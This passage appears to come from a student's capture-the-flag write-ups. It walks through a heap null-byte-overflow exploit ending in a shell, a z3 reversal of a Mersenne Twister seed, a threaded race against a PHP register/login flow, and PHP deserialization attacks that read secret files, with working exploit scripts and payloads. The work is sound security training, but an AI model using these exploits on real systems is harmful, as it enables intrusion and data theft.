bk: 0x7ffff7dcdc80

Allocated chunk
Addr: 0x405100
Size: 0x100

Free chunk (unsortedbin) | PREV_INUSE
Addr: 0x405200
Size: 0x211
fd: 0x7ffff7dcdc80
bk: 0x405000

Allocated chunk
Addr: 0x405410
Size: 0x210

Top chunk | PREV_INUSE
Addr: 0x405620
Size: 0x209e1
```

```
pwndbg> x/68gx 0x405200
0x405200:       0x0000000000000000      0x0000000000000211
0x405210:       0x00007ffff7dcdc80      0x0000000000405000
0x405220:       0x4141414141414141      0x4141414141414141
0x405230:       0x4141414141414141      0x4141414141414141
0x405240:       0x4141414141414141      0x4141414141414141
0x405250:       0x4141414141414141      0x4141414141414141
0x405260:       0x4141414141414141      0x4141414141414141
0x405270:       0x4141414141414141      0x4141414141414141
0x405280:       0x4141414141414141      0x4141414141414141
0x405290:       0x4141414141414141      0x4141414141414141
0x4052a0:       0x4141414141414141      0x4141414141414141
0x4052b0:       0x4141414141414141      0x4141414141414141
0x4052c0:       0x4141414141414141      0x4141414141414141
0x4052d0:       0x4141414141414141      0x4141414141414141
0x4052e0:       0x4141414141414141      0x4141414141414141
0x4052f0:       0x4141414141414141      0x4141414141414141
0x405300:       0x4141414141414141      0x4141414141414141
0x405310:       0x4141414141414141      0x4141414141414141
0x405320:       0x4141414141414141      0x4141414141414141
0x405330:       0x4141414141414141      0x4141414141414141
0x405340:       0x4141414141414141      0x4141414141414141
0x405350:       0x4141414141414141      0x4141414141414141
0x405360:       0x4141414141414141      0x4141414141414141
0x405370:       0x4141414141414141      0x4141414141414141
0x405380:       0x4141414141414141      0x4141414141414141
0x405390:       0x4141414141414141      0x4141414141414141
0x4053a0:       0x4141414141414141      0x4141414141414141
0x4053b0:       0x4141414141414141      0x4141414141414141
0x4053c0:       0x4141414141414141      0x4141414141414141
0x4053d0:       0x4141414141414141      0x4141414141414141
0x4053e0:       0x4141414141414141      0x4141414141414141
0x4053f0:       0x4141414141414141      0x4141414141414141
0x405400:       0x4141414141414141      0x4141414141414141
0x405410:       0x0000000000000210      0x0000000000000210
```

**That's needed to trigger the null byte**: in fact if we allocate again pokemon 1 and its name, we should get two identical sized chunks in the same spots as before, but the allocation of the chunk representing the pokemon name (chunk 3) would result in a null byte overflow into the name of pokemon 2 (chunk 4), which is immediatly after.

##### After executing the poisoning

This is the script `stdout` that led to the heap setup below:

```shell
creating a pokemon... done! id 0
creating a pokemon... done! id 1
creating a pokemon... done! id 2
creating a pokemon... done! id 3
renaming pkm (id: 2)
renaming pkm (id: 3)
creating a pokemon... done! id 4
renaming pkm (id: 3)
[1] initial setup done. Press any key to continue...
killing pkm (id: 3) :(
creating a pokemon... done! id 3
[2] freed B. Press any key to continue...
renaming pkm (id: 2)
[3] did null byte, now B length should be one byte smaller. Press any key to continue...
renaming pkm (id: 1)
creating a pokemon... done! id 5
[4] allocated B1 and B2. Press any key to continue...
killing pkm (id: 1) :(
creating a pokemon... done! id 1
[5] freed B1. Press any key to continue...
killing pkm (id: 4) :(
[6] freed C. Press any key to continue...
renaming pkm (id: 0)
[7] Allocated overlapping chunk. Press any key to continue...
```

```assembly
pwndbg> heap
Allocated chunk | PREV_INUSE
Addr: 0x405000
Size: 0x101

Allocated chunk | PREV_INUSE
Addr: 0x405100
Size: 0x101

Allocated chunk | PREV_INUSE
Addr: 0x405200
Size: 0x101

Allocated chunk | PREV_INUSE
Addr: 0x405300
Size: 0x101

Allocated chunk | PREV_INUSE
Addr: 0x405400
Size: 0x211

Allocated chunk | PREV_INUSE
Addr: 0x405610
Size: 0x411

Top chunk | PREV_INUSE
Addr: 0x405a20
Size: 0x205e1
```

```assembly
0x405610:       0x4141414141414141      0x0000000000000411
0x405620:       0x00007fff004d4b50      0x00007ffff7dcdd10
0x405630:       0x0000000000000208      0x0000000000000208
0x405640:       0x0000000000000208      0x0000000000000208
0x405650:       0x0000000000000208      0x0000000000000208
0x405660:       0x0000000000000208      0x0000000000000208
0x405670:       0x0000000000000208      0x0000000000000208
0x405680:       0x0000000000000208      0x0000000000000208
0x405690:       0x0000000000000208      0x0000000000000208
0x4056a0:       0x0000000000000208      0x0000000000000208
0x4056b0:       0x00000000000000a0      0x0000000000000100
0x4056c0:       0x0000000000000028      0x000000000000000a
0x4056d0:       0x0000000000000064      0x0000000000000064
0x4056e0:       0x0000000000000208      0x0000000000402036
0x4056f0:       0x0000000000000005      0x0000000000000208
0x405700:       0x0000000000000208      0x0000000000000208
0x405710:       0x0000000000000208      0x0000000000000000
0x405720:       0x0000000000000000      0x0000000000000000
0x405730:       0x0000000000000000      0x0000000000000000
0x405740:       0x0000000000000000      0x0000000000000000
0x405750:       0x0000000000000000      0x0000000000000000
0x405760:       0x0000000000000000      0x0000000000000000
0x405770:       0x0000000000000000      0x0000000000000000
0x405780:       0x0000000000000000      0x0000000000000000
0x405790:       0x0000000000000000      0x0000000000000000
0x4057a0:       0x0000000000000000      0x0000000000000000
0x4057b0:       0x0000000000000000      0x0000000000000061
0x4057c0:       0x00007ffff7dcdcd0      0x00007ffff7dcdcd0
0x4057d0:       0x0000000000000208      0x0000000000000208
0x4057e0:       0x0000000000000208      0x0000000000000208
0x4057f0:       0x0000000000000208      0x0000000000000208
0x405800:       0x0000000000000208      0x0000000000000208
0x405810:       0x0000000000000060      0x0000000000000208
0x405820:       0x0000000000000210      0x0000000000000100
0x405830:       0x0000000000000028      0x000000000000000a
0x405840:       0x0000000000000064      0x0000000000000064
0x405850:       0x0000000000000000      0x0000000000402036
0x405860:       0x0000000000000004      0x0000000000000000
0x405870:       0x0000000000000000      0x0000000000000000
0x405880:       0x0000000000000000      0x0000000000000000
0x405890:       0x0000000000000000      0x0000000000000000
0x4058a0:       0x0000000000000000      0x0000000000000000
0x4058b0:       0x0000000000000000      0x0000000000000000
0x4058c0:       0x0000000000000000      0x0000000000000000
0x4058d0:       0x0000000000000000      0x0000000000000000
0x4058e0:       0x0000000000000000      0x0000000000000000
0x4058f0:       0x0000000000000000      0x0000000000000000
0x405900:       0x0000000000000000      0x0000000000000000
0x405910:       0x0000000000000000      0x0000000000000000
0x405920:       0x0000000000000000      0x00000000000206e1
```

As you can see from `0x4056b0`, if we do the `heap` command in gdb, it does not report the overlapped chunk which we get printed when we manually print heap addresses. Looks like we managed to correctly overflow and allocate two overlapping chunks. Now we can exploit that to carry the attack.

#### And now?

Basically up to now we just did things to trick malloc into giving us two chunks allocated and overlapping. Now we can actuate the exploit, which consists in replacing the function pointer of some move of a pokemon (chunk B2) with our exploit to get rce. We can do that by writing a target address in the overlapped chunk resulting from the null byte overflow. The binary helps us because each pkm struct has an array of function pointer which gets called by a function of the binary. So, to recap:

1.  We perform the null byte exploit;
2.  We use the overlapping chunk to write an address of interest in the moves array of the overlapped pokemon;
3.  We call the function which executes the code at the given address to gain RCE.

We could write a `one_gadget` address, or somethigs else. In my case `one_gadget` was not working, so I wrote
the following into the overlapped pokemon:

```python
p = {
    'binsh' : b'/bin/sh\0',
    'stats' : p64(1000)*4,
    'name' : p64(0),
    'IVs' : p64(0)*5,
    'moves' : (p64(0) + p64(target))*10
}
```
With `binsh` written in the chunk header, since by checking with gdb I saw that the argument passed to the address called during the `fight_pkm` was in the beginning of its chunk. Problem is, first of all we need to leak an address belonging to `libc`... This can be done via some symbols already resolved and present in the `GOT`, since the binary is not `PIE`. If we exploit the overlapping chunks to put an adress of the `GOT` into one of the overlapped pokemon chunk, and in particular into the name field of the pkm struct, we can print a `libc` runtime address. Code for this:

```python
p = {
    'pkm' : b'PKM\0',
    'padding' : b'A'*196,
    'gotaddr' : p64(0x404018)   # nopie binary, we can hardcode addresses
}
rename_handler(r, pkFIN, len(formatter(p)), formatter(p))
leak = info_handler(r, pkB2)
libcleak = hex(unpack(leak[0], 'all', endian='little', sign=False))
print(colors['red'] + 'libc leak: {}'.format(hex(int(libcleak, 16))))
printer(colors['cyan'] + 
```

So we have a two stage exploit:

       1. First we leak `libc`
       2. Then we use the payload to spawn a shell

Script's `stdout` of the exploit in action:

```shell
renaming pkm (id: 0)
getting info about pkm (id: 5)
libc leak: 0x7ffff7a7f6c0
[8] Wrote address of GOT in some chunk to leak libc. Press any key to continue...
system address: 0x7ffff7a395f0
[9] Press any key to write target in memory...
renaming pkm (id: 0)
[10] Press any key to call target...
pkm 5 is fighting pkm 1 with 9
[*] Switching to interactive mode
 [%] (null) uses (null) on PKM!
$
```

## Symbolic

### pnrg

Very simple program in theory: it takes 4 truly random bytes from `/dev/random`, it checks them agains user input: if they are equal, it prints the flag. Basically we need to recover those random bytes. In the middle of this we have some calls to functions called `seedRand` and `genRandLong`, which together with the name of the challenge can give us some hints about its nature:

> Most [pseudo-random number generators (PRNGs)](https://en.wikipedia.org/wiki/Pseudorandom_number_generator) are build on algorithms involving some kind of recursive method starting from a base value that is determined by an input called the "seed".
> 
> ...
> 
> The purpose of the seed is to allow the user to "lock" the pseudo-random number generator, to allow replicable analysis. Some analysts like to set the seed using a [true random-number generator (TRNG)](https://en.wikipedia.org/wiki/Hardware_random_number_generator) which uses hardware inputs to generate an initial seed number, and then report this as a locked number. If the seed is set and reported by the original user then an auditor can repeat the analysis and obtain the same sequence of pseudo-random numbers as the original user. If the seed is not set then the algorithm will usually use some kind of default seed (e.g., from the system clock), and it will generally not be possible to replicate the randomisation.

There are various ways to solve the challenge, from symbolic analysis (the most sophisticated), to brute forcing (the simplest method).

From the Ghidra pseudocode we can deduce that `local_1408` is the internal state of the algorithm. It is a structure that holds all of its internal data. 

**Note**: the seed is 8 bytes long.

#### Symbolic execution method

Basically we need to replicate the behaviour of the program using z3 to reconstruct the final output. `main` code:

```c
  ...
  dev_rand = open("/dev/random",0);
  read(dev_rand,&local_1418,4);
  close(dev_rand);
  seedRand(internalState,(long)(int)local_1418);
  for (local_1414 = 0; local_1414 < 1000; local_1414 = local_1414 + 1) {
    genRandLong(internalState);
  }
  uVar1 = genRandLong(internalState);
  printf("%#lx, ",uVar1);
  ...
```

```python
import z3

def seedRand(i):
    return i

def genRandLong():
    return 0

seed = z3.BitVec('seed', 32)

seedRand(seed)
for _ in range(1000):
    genRandLong()

output = genRandLong()

z3.solver(output == 0xaabbccdd)
```

What's the hard part here? We need to replicate the gen and seed function as they are in the binary.

**Where to start?** Let's look at `genRandLong`:

```c
ulong genRandLong(undefined8 *param_1)

{
  int iVar1;
  ulong uVar2;
  int local_14;

  if ((0x26f < *(int *)(param_1 + 0x270)) || (*(int *)(param_1 + 0x270) < 0)) {
    if ((0x270 < *(int *)(param_1 + 0x270)) || (*(int *)(param_1 + 0x270) < 0)) {
      m_seedRand(param_1,0x1105);
    }
    for (local_14 = 0; local_14 < 0xe3; local_14 = local_14 + 1) {
      param_1[local_14] =
           param_1[local_14 + 0x18d] ^
           (ulong)(((uint)param_1[local_14 + 1] & 0x7fffffff | (uint)param_1[local_14] & 0x80000000)
                  >> 1) ^ *(ulong *)(mag.3808 + (ulong)((uint)param_1[local_14 + 1] & 1) * 8);
    }
    for (; local_14 < 0x26f; local_14 = local_14 + 1) {
      param_1[local_14] =
           param_1[local_14 + -0xe3] ^
           (ulong)(((uint)param_1[local_14 + 1] & 0x7fffffff | (uint)param_1[local_14] & 0x80000000)
                  >> 1) ^ *(ulong *)(mag.3808 + (ulong)((uint)param_1[local_14 + 1] & 1) * 8);
    }
    param_1[0x26f] =
         param_1[0x18c] ^
         (ulong)(((uint)*param_1 & 0x7fffffff | (uint)param_1[0x26f] & 0x80000000) >> 1) ^
         *(ulong *)(mag.3808 + (ulong)((uint)*param_1 & 1) * 8);
    *(undefined4 *)(param_1 + 0x270) = 0;
  }
  iVar1 = *(int *)(param_1 + 0x270);
  *(int *)(param_1 + 0x270) = iVar1 + 1;
  uVar2 = param_1[iVar1] ^ (ulong)param_1[iVar1] >> 0xb;
  uVar2 = uVar2 ^ (uint)(uVar2 << 7) & 0x9d2c5680;
  uVar2 = uVar2 ^ (uint)(uVar2 << 0xf) & 0xefc60000;
  return uVar2 ^ uVar2 >> 0x12;
}
```

Ok, it looks a bit scary... A quick google search of the constants brings up the algorithm that is being implemented here: Marsenne Twister 19937 generator.

> A pseudo-random number generator engine that produces unsigned integer numbers in the closed interval $[0,2^{w}-1]$.
> 
> The algorithm used by this engine is optimized to compute large series of numbers (such as in Monte Carlo experiments) with an almost uniform distribution in the range.
> 
> The engine has an internal state sequence of *n* integer elements, which is filled with a pseudo-random series generated on [construction](https://www.cplusplus.com/mersenne_twister_engine::mersenne_twister_engine) or by calling member function [seed](https://www.cplusplus.com/mersenne_twister_engine::seed).
> 
> The internal state sequence becomes the source for *n* elements: When the state is advanced (for example, in order to produce a new random number), the engine alters the state sequence by *twisting* the current value using xor mask *a* on a mix of bits determined by parameter *r* that come from that value and from a value *m* elements away (see [operator()](https://www.cplusplus.com/mersenne_twister_engine::operator()) for details).
> 
> The random numbers produced are tempered versions of these twisted values. The tempering is a sequence of shift and xor operations defined by parameters *u*, *d*, *s*, *b*, *t*, *c* and *l* applied on the selected state value (see [operator()](https://www.cplusplus.com/mersenne_twister_engine::operator())).
> 
> The random numbers generated by `mersenne_twister_engine` have a period equivalent to the *mersenne number* $2^{(n-1)w}-1$.

**Note about IPython**

If we want to execute some code in python and then manipulate its output manually or to play with it, we can append this at the end of the script:

```python
from IPython import embed
embed()
```

##### `seedRand`

Let's start by converting `m_seedRand` in python:

```c
void m_seedRand(ulong *state,ulong seed)

{
  *state = seed & 0xffffffff;
  *(undefined4 *)(state + 0x270) = 1;
  while (*(int *)(state + 0x270) < 0x270) {
    state[*(int *)(state + 0x270)] =
         (ulong)(uint)((int)state[*(int *)(state + 0x270) + -1] * 0x17b5);
    *(int *)(state + 0x270) = *(int *)(state + 0x270) + 1;
  }
  return;
}
```

```python
def seedRand(state, seed):
    state = seed & 0xffffffff;
    state[0x271] = 1
    while state[0x270] < 0x270:
        state[state[0x271]] = state[state[0x271]-1] * 0x17b5
        state[0x271] = state[0x271] + 1
    return state
```

Now, since state is an important structure in the original algorithm, it is better to initialize it as a class in our exploit:

```python
class State:
    def __init__(self):
        self.state = [0]*270
        self.index = 0
```

Which means we can simplify the previous implementation:

```python
def seedRand(s, seed):
    s.state[0] = seed & 0xffffffff;
    s.index = 1;
    while s.index < 0x270:
        s.state[s.index] = s.state[s.index - 1] * 0x17b5
        s.index = s.index + 1
    return s
```

##### `genRandLong`

```c
ulong genRandLong(undefined8 *param_1)

{
  int iVar1;
  ulong uVar2;
  int local_14;

  if ((0x26f < *(int *)(param_1 + 0x270)) || (*(int *)(param_1 + 0x270) < 0)) {
    if ((0x270 < *(int *)(param_1 + 0x270)) || (*(int *)(param_1 + 0x270) < 0)) {
      m_seedRand(param_1,0x1105);
    }
    for (local_14 = 0; local_14 < 0xe3; local_14 = local_14 + 1) {
      param_1[local_14] =
           param_1[local_14 + 0x18d] ^
           (ulong)(((uint)param_1[local_14 + 1] & 0x7fffffff | (uint)param_1[local_14] & 0x80000000)
                  >> 1) ^ *(ulong *)(mag.3808 + (ulong)((uint)param_1[local_14 + 1] & 1) * 8);
    }
    for (; local_14 < 0x26f; local_14 = local_14 + 1) {
      param_1[local_14] =
           param_1[local_14 + -0xe3] ^
           (ulong)(((uint)param_1[local_14 + 1] & 0x7fffffff | (uint)param_1[local_14] & 0x80000000)
                  >> 1) ^ *(ulong *)(mag.3808 + (ulong)((uint)param_1[local_14 + 1] & 1) * 8);
    }
    param_1[0x26f] =
         param_1[0x18c] ^
         (ulong)(((uint)*param_1 & 0x7fffffff | (uint)param_1[0x26f] & 0x80000000) >> 1) ^
         *(ulong *)(mag.3808 + (ulong)((uint)*param_1 & 1) * 8);
    *(undefined4 *)(param_1 + 0x270) = 0;
  }
  iVar1 = *(int *)(param_1 + 0x270);
  *(int *)(param_1 + 0x270) = iVar1 + 1;
  uVar2 = param_1[iVar1] ^ (ulong)param_1[iVar1] >> 0xb;
  uVar2 = uVar2 ^ (uint)(uVar2 << 7) & 0x9d2c5680;
  uVar2 = uVar2 ^ (uint)(uVar2 << 0xf) & 0xefc60000;
  return uVar2 ^ uVar2 >> 0x12;
}
```

Wtf is `mag.3808`? It a global variable 16 bytes big. The first 8 are null, while the remaining 8 are a hexadecimal value. Note also that its index is `& 1`, which means that it is either 0 or 1 (ampersand of arity two is the bitwise AND operator). This translates in python as:

```python
MAG = [0x0, 0x9908b0df]
def mag(i):
    return z3.If(i == 0, 0x0, 0x9908b0df)
```

Actually this does not work:

```python
raise Z3Exception(msg)
z3.z3types.Z3Exception: sort mismatch
```

Because it is a python integer and z3 does not know how to work with it. Solution: create a `BitVecVal`.

Python translation of the function :

```python
def genRandLong(s):
    if ((0x26f < s.index) or (s.index < 0)):
        if ((0x270 < s.index) or (s.index < 0)):
            seedRand(s,0x1105) 
    for local_14 in range(0xe3):
        p1 = s.state[local_14 + 0x18d]
        p2 = (s.state[local_14 + 1] & 0x7fffffff | s.state[local_14] & 0x80000000) >> 1
        p3 = mag((s.state[local_14 + 1] & 1))
        s.state[local_14] = p1 ^ p2 ^ p3

    for local_14 in range(0xe3, 0x26f): 
        p1 = s.state[local_14 - 0xe3]
        p2 = s.state[local_14 + 1] & 0x7fffffff | s.state[local_14] & 0x80000000 >> 1
        p3 = mag((s.state[local_14 + 1] & 1))
        s.state[local_14] = p1 ^ p2 ^ p3

    p1 = s.state[0x18c]
    p2 = (s.state[0] & 0x7fffffff | s.state[0x26f] & 0x80000000) >> 1
    p3 = mag((s.state[0] & 1))
    s.state[0x26f] = p1 ^ p2 ^ p3
    s.index = 0
    iVar1 = s.index
    s.index = iVar1 + 1
    uVar2 = s.state[iVar1] ^ s.state[iVar1] >> 0xb
    uVar2 = uVar2 ^ (uVar2 << 7) & 0x9d2c5680
    uVar2 = uVar2 ^ (uVar2 << 0xf) & 0xefc60000
    rand_num = uVar2 ^ uVar2 >> 0x12
    return s, rand_num
```

Note that we need to fix variable length: if we multiply two 32 bit numbers, the output would be 64 bits long. We need to add an ampersand `0xffffffff` after the multiplication.

**Bruteforce approach**

Recall: this code is a random number generator with a random seed. The challenge prints out the 1001 random number and it asks for the random seed. Up until now we saw constraint programming (**symbolic execution**). We can also bruteforce it **locally**. It can be done two ways: by restarting every time the challenge binary, which can be costly, or by reimplementing the algorithm in another binary and launching this modified binary only one time.

**Note**: code without syscalls is faster.

Why are we able to reverse: from the same state we can always get the same output. **The only random part of the algorithm is the seed**.

### prodkey

We have a 30 characters long key that we have to guess to get the flag, which is stored remotely. To check the correctness of our input flag the binary calls a function called `verify_key`, which returns 1 if its correct, 0 otherwise.

More specifically this is the check implemented by `verify_key`:

```c
cVar1 = check_01(key);
if (((((cVar1 == '\0') || (cVar1 = check_02(key), cVar1 == '\0')) ||
         (cVar1 = check_03(key), cVar1 == '\0')) ||
        (((cVar1 = check_04(key), cVar1 == '\0' || (cVar1 = check_05(key), cVar1 == '\0')) ||
         ((cVar1 = check_06(key), cVar1 == '\0' ||
          ((cVar1 = check_07(key), cVar1 == '\0' || (cVar1 = check_08(key), cVar1 == '\0')))))))) ||
       ((cVar1 = check_09(key), cVar1 == '\0' ||
        (((((cVar1 = check_0A(key), cVar1 == '\0' || (cVar1 = check_0B(key), cVar1 == '\0')) ||
           (cVar1 = check_0C(key), cVar1 == '\0')) ||
          ((cVar1 = check_0D(key), cVar1 == '\0' || (cVar1 = check_0E(key), cVar1 == '\0')))) ||
          (cVar1 = check_0F(key), cVar1 == '\0')))))) {
auth = 0;
```

As we can see we have a bunch of functions that have to **not** return zero in order fot the check to pass. We need z3 to reverse them. They are 16 (one for each hexadecimal cypher). Or we can use angr. Using z3 can be quite time consuming, since we have to rework all the checks functions to be compatible with z3's symbolic data types. Foe example `check_01` would go from:

```c
undefined8 check_01(char *key)

{
  undefined8 auth;
  
  if ((((key[5] == '-') && (key[11] == '-')) && (key[17] == '-')) && (key[23] == '-')) {
    auth = 1;
  }
  else {
    auth = 0;
  }
  return auth;
}
```

To:

```python
def check01(key):  
    return If(
        And(
            And(
                And(
                  (Extract(5, 5, key) == '-'), (Extract(11, 11, key) == '-')
                ), 
            (Extract(17, 17, key) == '-')
            ),
        (Extract(23, 23, key) == '-')
        ),
    1, 0
)
```

## Race condition

### aart

**Goal**: register a user and login before that the restriction gets activated. This is the point of the **race condition**: we need to make the login happen before the registration is actually complete. More specifically, this is from `register.php`:

```php
if(isset($_POST['username'])){
	$username = mysqli_real_escape_string($conn, $_POST['username']);
	$password = mysqli_real_escape_string($conn, $_POST['password']);

	$sql = "INSERT into users (username, password) values ('$username', '$password');";

	mysqli_query($conn, $sql);
	$sql = "INSERT into privs (userid, isRestricted) values ((select users.id from users where username='$username'), TRUE);";
	mysqli_query($conn, $sql);
	?>
	<h2>SUCCESS!</h2>
	<?php
}
```

And this is from `login.php`:

```php
if($_POST['username'] === $row['username'] and $_POST['password'] === $row['password']){
		?>
		<h1>Logged in as <?php echo($username);?></h1>
		<?php

		$uid = $row['id'];
		$sql = "SELECT isRestricted from privs where userid='$uid' and isRestricted=TRUE;";
		$result = mysqli_query($conn, $sql);
		$row = $result->fetch_assoc();
		if($row['isRestricted']){
			?>
			<h2>This is a restricted account</h2>

			<?php
		}else{
			?>
			<h2><?php include('../key');?></h2>
			<?php

		}
	?>
	<h2>SUCCESS!</h2>
	<?php
	}
```

And we need to make registration and login happen at the same time in order to be able to login before that `INSERT into privs (userid, isRestricted) values ((select users.id from users where username='$username'), TRUE);` gets executed.

#### Toolkit

Best python library for handling HTTP requests, hands down. We'll use it for this challenge, since both the login and registration functions are POST requests. To look at requests we could use chrome developer tools or wireshark since HTTP requests are in clear.

#### Approach

First approach: we can try making the registration and the login happen at the same time. This will not work:

```python
import requests
def registration(user, password):
  url = "%s/register.php" % HOST
  r = requests.post(url, data={'username': user, 'password': password})
  if '"SUCCESS!" "SUCCESS!" in r.text:
      return True
  return False 

def login(user, password):
  url = "%s/login.php" % HOST
  r = requests.post(url, data={'username': user, 'password': password}) 
  print(r.text) 

registration('qweqwe','qweqwe')
login('qweqwe','qweqwe') 
```

Since the login is not fast enough. We need a multi-threading library.

```python
import threading, requests
HOST = "http://aart.training.jinblack.it" 
def randomString(N):
  return ''.join(random.choices(string.ascii_uppercase + string.ascii_lowercase + string.digits, k=N)) 

def registration(user, password):
  url = "%s/register.php" % HOST
  r = requests.post(url, data={'username': user, 'password': password})
  if "SUCCESS!" in r.text:
    return True
  return False 

def login(user, password):
  url = "%s/login.php" % HOST
    r = requests.post(url, data={'username': user, 'password': password})
  print(r.text) 

  while True:
    username = randomString(10)
    password = randomString(10)
    r = threading.Thread(target=registration, args=(username, password))
    l = threading.Thread(target=login, args=(username, password))
    r.start()
    l.start() 
```

The code above actually prints the flag.

**Note**: we need a new username for each attempt, which means that a random string generator as username would be a good choice to make the exploitation simpler.

## Serialization

### lolshop

We wanto to exploit the `restore` function, since it has a vulnerability which can allow execution of non serialized malicious code. Ideally we would also like to exploit the `getPicture` function in `products.php`, since it has an hardcoded path into it. Note that it is also called into a `toDict` function.

To recap: we need to read the secret file. We have a compressed internal state variable, which we would like to decode. It is send back and forth via requests and it is encoded in base 64:

```python
import zlib
zlib.decompress(state)
```

The result is a php serialized object. We can inject anything we want into it. We need another class / more than on class to get a print of the secret file present in the server's file system.

#### In a nutshell

If we send a product instead of a state, the `toDict` of the product is going to be called. The output will contain the `getPicture` function, which will read from the filesystem the path we want, which will be the secret file. Code for that:

```python
import zlib, base64, requests, subprocess
from IPython import embed

obj = subprocess.check_output(['php', 'payload.php'])
payload = base64.b64encode(zlib.compress(obj))
print('encoded payload: {}'.format(payload.decode('utf-8')))

print('sending payload...')
r = requests.post("http://jinblack.it:3006/api/cart.php", data={
  'state': payload
})
print('status code: {}'.format(r))
embed()
```

What do we put in the `payload.php` script? The quickest way to generate the PHP code is to use the php shell (`php -a`):

```php
php > ...
php > $p = new Product(0, 'xcv', 'xcv', '../../../../secret/flag.txt', 0);
php > echo serialize($p);
```

In the first line we copied into the console all the class code from the website source code.

**Note:** HTTP status code 500 means internal serve error. It is good, since it means that there's something wrong that we can exploit.

### free-as-in-beer

We do not have any source code... We just have the url of the challenge, and some hints: we know that the flag is contained in the `flag.php` file, and that we'll probably find some exploitable code if we look carefully. In fact we can find some PHP source code in plain text:

```php
*/?><?php

Class GPLSourceBloater{
    public function __toString()
    {
        return highlight_file('license.txt', true).highlight_file($this->source, true);
    }
}


if(isset($_GET['source'])){
    $s = new GPLSourceBloater();
    $s->source = __FILE__;

    echo $s;
    exit;
}

$todos = [];

if(isset($_COOKIE['todos'])){
    $c = $_COOKIE['todos'];
    $h = substr($c, 0, 32);
    $m = substr($c, 32);

    if(md5($m) === $h){
        $todos = unserialize($m);
    }
}

if(isset($_POST['text'])){
    $todo = $_POST['text'];

    $todos[] = $todo;
    $m = serialize($todos);
    $h = md5($m);

    setcookie('todos', $h.$m);

    header('Location: '.$_SERVER['REQUEST_URI']);
    exit;
}

?>
<html>
<head>
    <style>
    * {font-family: "Comic Sans MS", cursive, sans-serif}
    </style>
</head>

<h1>My open/libre/free/PHP/Linux/systemd/GNU TODO List</h1>
<a href="?source"><h2>It's super secure, see for yourself</h2></a>
<ul>
<?php foreach($todos as $todo):?>
    <li><?=$todo?></li>
<?php endforeach;?>
</ul>

<form method="post" href=".">
    <textarea name="text"></textarea>
    <input type="submit" value="store">
</form>
```

I'm a bit of a novice in PHP, so let's look more carefully at what we're dealing with. Here's some notes:

* ```php
  substr(string $string, int $offset, ?int $length = null): string
  ```

  Returns the portion of `string` specified by the `offset` and `length` parameters.

* ```php
  md5(string $string, bool $binary = false): string
  ```

  Calculates the MD5 hash of `string` using the [» RSA Data Security, Inc. MD5 Message-Digest Algorithm](http://www.faqs.org/rfcs/rfc1321), and returns that hash.

* [`__FILE__`](http://us2.php.net/manual/en/language.constants.predefined.php) is a magic constant that gives you the filesystem path to the current .php file (the one that `__FILE__` is in, not the one it's included by if it's an include.

* `REQUEST_URI`: The URI which was given in order to access this page; for instance, '`/index.html`'.

* ```php
  header(string $header, bool $replace = true, int $response_code = 0): void
  ```

  **header()** is used to send a raw HTTP header. See the [» HTTP/1.1 specification](http://www.faqs.org/rfcs/rfc2616) for more information on HTTP headers.

#### A first approach

This is the exploitable part of the code, leaked in the html of the page:

```php
Class GPLSourceBloater{
    public function __toString()
    {
        return highlight_file('license.txt', true).highlight_file($this->source, true);
    }
}


if(isset($_GET['source'])){
    $s = new GPLSourceBloater();
    $s->source = __FILE__;

    echo $s;
    exit;
}
```

**PHP magic methods recall**

Recall on magic methods such as `__toString`:

>Magic methods are special methods which override PHP's default's action when certain actions are performed on an object.
>
>**Caution**
>
>All methods names starting with `__` are reserved by PHP. Therefore, it is not recommended to use such method names unless overriding PHP's behavior.
>
>...
>
>```php
>public __toString(): string
>```
>
>The [__toString()](https://www.php.net/manual/en/language.oop5.magic.php#object.tostring) method allows a class to decide how it will react when it is treated like a string. For example, what `echo $obj;` will print.
>
>Source: [PHP: Magic Methods - Manual](https://www.php.net/manual/en/language.oop5.magic.php)

**To recap**

Basically we need to serialize an instance of the `GPLSourceBloater` class with the `source` variable setted as `flag.php`. To achieve that we create the object, serialize it, and put it in the `todos` array. After that it's just a matter of sending a GET to the server with our custom cookie and the flag will be printed.

### metactf

More complex than free-as-in-beer. We have two classes: `User` and `Challenge`:

```php
<?php
// ini_set('display_errors', 1);
// ini_set('display_startup_errors', 1);
// error_reporting(E_ALL);
// error_reporting(0);

class User{
  public $name;
  public $id;
  public $isAdmin;
  public $solved;
  public $points;

  function __construct($id, $name){
    $this->id = $id;
    $this->name = $name;
    $this->isAdmin = false;
    $this->solved = array();
    $this->points = 0;
  
  }

  function setSolved($challid){
    array_push($this->solved, $challid);
  }

}

class Challenge{
  //WIP Not used yet.
  public $name;
  public $description;
  public $setup_cmd=NULL;
  // public $check_cmd=NULL;
  public $stop_cmd=NULL;

  function __construct($name, $description){
    $this->name = $name;
    $this->description = $description;
  }

  function start(){
    if(!is_null($this->setup_cmd)){
      $output=null;
      $retval=null;
      echo("Starting challenge!");
      exec($this->setup_cmp, $output, $retval);
      echo($output[0]);
    }
  }

  function stop(){
    if(!is_null($this->stop_cmd)){
      $output=null;
      $retval=null;
      echo("Stoping challenge!");
      exec($this->stop_cmd, $output, $retval);
      echo($output[0]);
    }
  }
  
  function __destruct(){
    $this->stop();
  }
}
?>
```

We can both download and upload user objects: those get serialized before being downloaded, and unserialized after being uploaded. Since the web app hasn't got any user input validation/sanitization, we can put everything we want into the user object.

**About user objects**

Here's what we get if we create a user and download its serialized object:

```php
O:4:"User":5:{s:4:"name";s:3:"zzz";s:2:"id";i:6904;s:7:"isAdmin";b:0;s:6:"solved";a:0:{}s:6:"points";i:0;}%
```

Which becomes:

```php
object(User)#1 (5) {
  ["name"]=>
  string(3) "zzz"
  ["id"]=>
  int(6904)
  ["isAdmin"]=>
  bool(false)
  ["solved"]=>
  array(0) {
  }
  ["points"]=>
  int(0)
}
```

**Note about `fetch_assoc()`**

```php
$info = $res->fetch_assoc();
$isadmin = $info['isadmin'] == 1;
$res->close();
return $isadmin;
```

It is used to fetch a result row as an associative array.

**Magic methods in this challenge**

* `__construct`: If you create a `__construct()` function, PHP will automatically call this function when you create an object from a class.
* `__destruct`: If you create a `__destruct()` function, PHP will automatically call this function at the end of the script. This is the method we'll exploit to leak the flag.

#### A first approach

I tried downloading the default user object created by the website, changing the number of points and setting `isAdmin` to `true`:

```php
❯ php user.php
object(User)#1 (5) {
  ["name"]=>
  string(3) "123"
  ["id"]=>
  int(0)
  ["isAdmin"]=>
  bool(true)
  ["solved"]=>
  array(0) {
  }
  ["points"]=>
  int(999)
}
